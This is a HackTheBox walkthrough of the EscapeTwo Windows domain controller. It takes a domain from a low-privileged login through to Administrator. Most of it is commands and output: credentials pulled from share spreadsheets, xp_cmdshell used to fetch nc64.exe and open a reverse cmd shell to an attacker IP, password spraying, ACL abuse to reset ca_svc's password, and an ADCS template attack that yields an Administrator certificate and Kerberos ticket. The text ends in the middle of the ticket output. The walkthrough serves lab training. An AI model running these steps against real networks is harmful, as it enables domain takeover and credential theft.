---
title: Escape2 - A HackTheBox machine
author: amandaguglieri
draft: false
TableOfContents: true
Date: 20250903
tags:
  - walkthrough
---
# Escape2 - A HackTheBox machine

## Description

![[EscapeTwo.png]]

`EscapeTwo` is an easy difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. We leverage these credentials to access a file share containing a corrupted Excel document. By modifying its byte structure, we extract credentials. These are then sprayed across the domain, revealing valid credentials for a user with access to `MSSQL`, granting us initial access. System enumeration reveals `SQL` credentials, which are sprayed to obtain `WinRM` access. Further domain analysis shows the user has write owner rights over an account managing `ADCS`. This is used to enumerate `ADCS`, revealing a misconfiguration in `Active Directory Certificate Services`. Exploiting this misconfiguration allows us to retrieve the `Administrator` account hash, ultimately leading to complete domain compromise.

## user.txt


```
  Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
```


As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su


We enumerate the services in the target:

```bash
sudo nmap -sV -sC ~ip -Pn --top-ports 10000
```

Output:

```
ot shown: 8362 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-31 13:06:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-31T13:07:58+00:00; +4m05s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-31T13:07:58+00:00; +4m05s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.118.128:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-31T13:05:43
|_Not valid after:  2055-01-31T13:05:43
| ms-sql-info: 
|   10.129.118.128:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-01-31T13:07:58+00:00; +4m05s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-31T13:07:58+00:00; +4m05s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-31T13:07:58+00:00; +4m05s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49725/tcp open  msrpc         Microsoft Windows RPC
49745/tcp open  msrpc         Microsoft Windows RPC
60956/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 5m48s, deviation: 0s, median: 5m48s
| smb2-time: 
|   date: 2025-02-09T17:52:05
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    

```

The tester is provided  with credentials for the following account: rose / KxEPkKe6R8su.

Add mapping to hosts file: 

```bash
echo "10.129.232.128   dc01.sequel.htb dc01 sequel.htb" | sudo tee -a /etc/hosts
```

Enumerate users and password policy with:

```bash
crackmapexec smb $ip -u rose -p KxEPkKe6R8su --users
```

Save the output as users.txt: 

```
Administrator
Guest
krbtgt
ryan
oscar
sql_svc
rose
ca_svc
```

Enumerate users and password policy with:

```
crackmapexec smb $ip -u rose -p KxEPkKe6R8su --pass-pol
```

Output: 

```
SMB         10.129.48.159  445    DC01             Minimum password age: 1 day 4 minutes 
SMB         10.129.48.159 445    DC01             Reset Account Lockout Counter: 10 minutes 
SMB        10.129.48.159  445    DC01             Locked Account Duration: 10 minutes 
SMB         10.129.48.159  445    DC01             Account Lockout Threshold: None
SMB         10.129.48.159  445    DC01             Forced Log off Time: Not Set

```

Enumerate shares in 

```bash
crackmapexec smb 10.129.48.159 -u rose -p KxEPkKe6R8su --shares
```

Connect to the existing shares. After browsing around, download two files:

```bash
smbclient  \\\\10.129.48.159\\'Accounting Department' -U rose
# Enter password when prompted: KxEPkKe6R8su

dir
get accounting_2024.xlsx
get accounts.xlsx
quit
```

From these files, extract the following users and passwords ( unzip them and read the xml files inside):

```
angela:0fwz7Q4mSpurIt99
oscar:86LxLBMgEWaKUnBG
kevin:Md9Wlq1E5bZnVDVo
sa:MSSQLP@ssw0rd!
```

Connet to the msSQL server:

```bash
python3 mssqlclient.py -p 1433 sa@10.129.42.172 
# When prompted, enter credentials: MSSQLP@ssw0rd!
```

Run as admin in the connection to the mssql server:

```mysql
# To allow advanced options to be changed.   
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE

# To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE

# sp_configure displays or changes global configuration settings for the current settings. This is how to take advantage of it:
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE

# Now Upload a nc file to obtain a reverse shell:
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.113/nc64.exe -outfile nc64.exe"

# Open a listener
nc -lnvp 1234

# And trigger the listener
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.113 1234";
```

Note the file `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI`, where the tester can retrieve the following credentials:

```bash
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
```

Run a password spray attack:

```bash
crackmapexec smb 10.129.42.172 -u ~/borrar/users.txt -p WqSZAF6CysDQbGb3  --continue-on-success | grep +
```

Output: 

```
10.129.42.172   445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
10.129.42.172   445    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3
```

Connect via evil-winrm with ryan:WqSZAF6CysDQbGb3: 

```bash
evil-winrm -i 10.129.42.172 -u ryan -p WqSZAF6CysDQbGb3 
```

Print the flag:

```powershell
type C:\Desktop\user.txt
```

Output: 21033cea9bb3884f391ee21423396f70

## root.txt

Ensure time is in sync (Kerberos is picky): Keep skew < 5 minutes.

```bash
sudo ntpdate -s $ip 
```

Prepare a mnimal krb5.conf (optional if using -dc-ip):

```
[libdefaults]
  default_realm = SEQUEL.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  SEQUEL.HTB = {
    kdc = DC01.sequel.htb
    admin_server = DC01.sequel.htb
  }

[domain_realm]
  .sequel.htb = SEQUEL.HTB
  sequel.htb = SEQUEL.HTB

```

Create a TGT ticket for r.thompson user:

```bash
getTGT.py sequel.htb/'ryan':'WqSZAF6CysDQbGb3'

export KRB5CCNAME=$(pwd)/ryan.ccache
```

Run bloodhound:

```bash
bloodhound-python -u ryan -p WqSZAF6CysDQbGb3 -k -ns 10.129.232.128 -c All -d sequel.htb --zip
```

Note that ryan has WriteOwner rights on CA_SVC@sequel.htb. 


![[write-owner.png]]

Enumerate certificates:

```
certipy find -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -dc-ip 10.129.232.128
```

Output:

```
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sequel-DC01-CA'
[*] Checking web enrollment for CA 'sequel-DC01-CA' @ 'DC01.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250903205933_Certipy.txt'
[*] Wrote text output to '20250903205933_Certipy.txt'
[*] Saving JSON output to '20250903205933_Certipy.json'
[*] Wrote JSON output to '20250903205933_Certipy.json'

```

Access with evil-winrm:

```bash
evil-winrm -i 10.129.232.128 -u ryan -p WqSZAF6CysDQbGb3
```

Set a listener in the attacker machine and serve PowerView.ps1:

```bash
python -m http.server 80
```

Download to ryan's session:

```powershell
curl http://10.10.14.169/PowerView.ps1 -o PowerView.ps1
curl http://10.10.14.169/Rubeus.exe -o Rubeus.exe
```

**Set-DomainObjectOwner** to assign ownership, followed by **Add-DomainObjectAcl** to grant full permissions on the target object.

```powershell
powershell -ep bypass

Import-Module .\PowerView.ps1

Set-DomainObjectOwner -Identity 'ca_svc' -OwnerIdentity 'ryan'

Add-DomainObjectAcl -Rights 'All' -TargetIdentity "ca_svc" -PrincipalIdentity "ryan"
```

Validate the results:

```powershell
Get-DomainUser | Where-Object { $_.Name -like "*ryan*" } | Select-Object Name, Objectsid


Get-DomainObjectAcl -Identity 'CA_SVC' | Where-Object { $_.ActiveDirectoryRights -eq 'GenericAll' }
```


Once a user has been granted full control over a target, they can perform actions such as kerberoasting or change the password without knowing the target’s current password (ForceChangePassword).


**Reset User Password**

Using the **PowerView** module, an attacker can reset a domain user’s password. This can be performed with the Set-DomainUserPassword cmdlet, allowing control over a targeted account.

```
$NewPassword = ConvertTo-SecureString 'Lala123' -AsPlainText -Force

Set-DomainUserPassword -Identity 'ca_svc' -AccountPassword $NewPassword

```


Create a TGT ticket for ca_svc user:

```bash
getTGT.py sequel.htb/'ca_svc':'Lala123'

export KRB5CCNAME=$(pwd)/ca_svc.ccache
```

Run bloodhound:

```bash
bloodhound-python -u ca_svc -p Lala123 -k -ns 10.129.232.128 -c All -d sequel.htb --zip
```

```bash
certipy template -u ca_svc@sequel.htb -p 'Lala123' -dc-ip 10.129.232.128 \         
  -template DunderMifflinAuthentication \
  -save-configuration DunderMifflinAuthentication.json


certipy template -u ca_svc@sequel.htb -p 'Lala123' -dc-ip 10.129.232.128 \
  -template DunderMifflinAuthentication \
  -write-default-configuration -no-save

certipy req -username ca_svc -password 'Lala123' -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn administrator

```


```
cat administrator.pfx | base64 -w 0
```

Output:

```
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
```

Ask TGT via Rubeus:

```powershell
.\Rubeus.exe asktgt /user:administrator /certificate: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  /nowrap
```

Output:

```

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ca_svc
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBGdApSJIGsBUEsmJHFLdPoWz3hb7koCkC8NjsuxvbOjQdmr5qrEV8zYt+1im5LbFnwm83I59q7CoXkAlnMyZAij9diWy8v0Q1B5VKLLimXnIAszlh/q4OOaEsozg3gHCvDX9kJ7CfFIP8vCXiD9fP9RrF1CJmqDb2oO90529L+xIDU0R+9BjtyMq0w+wRtOeICw9Ij7+dHsuohnoCLIcg/AahOSY4xMvvzalzi0ry03PzMyWTSc+sgBgu8FsOqx14UnNBcxXe+QIzVctlK3OwafGEM8UKeFZAUG8FZX95xEh2vY+ZqIDMPQ1sjnOmhk5dbFnqzaK+hT5Ii3ROGx1g0T3oMRpAkHkSW8ac33gmsNyBtlwm9Fq2rPC2dLrf/qyNv/AJMKnvbpRuBUAhA/u5NdByRlQmjFa1Y4ySXbM7eX1YSQNvgbiq/GcFk2Kl2PQJpHeBWYTwk6Dkx1WpfVSkIKytOIBZq/46+EVNVw1c+4QqXeGrJik/Qyrhurn5CA6Sd69T85fiHcYqmq3fTmZrHxMb98sMkpkJKzLIfCOXIsEp/wq2iBwKgWRGKJQKL++FT6w0fhtWf6IDSADaAe4JBHirG+HnqAJvI2B8l7Cr1lcJE5xgiMzd4YAtmrHPvzI1kpgNRDuj5nWuGEP1fqwxhElhdzrKZn0oV/e3+VBfrc5yB1SghXqrmMDZMXwf/6TdvKh8SaoEtB44Hx6C0epNM/+zLcgxcs+TRMcK0phKf/OdlSTC72eut4eDFLclNLq